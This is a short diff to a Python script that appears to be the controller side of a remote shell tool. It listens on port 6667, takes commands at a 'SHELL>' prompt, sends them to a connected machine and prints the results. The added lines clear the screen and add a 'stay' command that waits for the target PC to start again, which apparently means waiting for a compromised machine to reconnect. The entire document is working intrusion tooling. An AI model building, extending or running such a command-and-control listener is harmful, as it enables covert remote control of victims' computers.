@@ -4,6 +4,7 @@ IP = "192.168.0.15"
 PORT = 6667
 BUFFER = 1024
 
+os.system("cls")
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 server.bind((IP, PORT))
@@ -16,6 +17,8 @@ if conn:
         cmd = input("SHELL> ")
         if cmd == "exit":
             break
+        if cmd == "stay":
+            print("[/] await the pc start!")
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
         print(output)
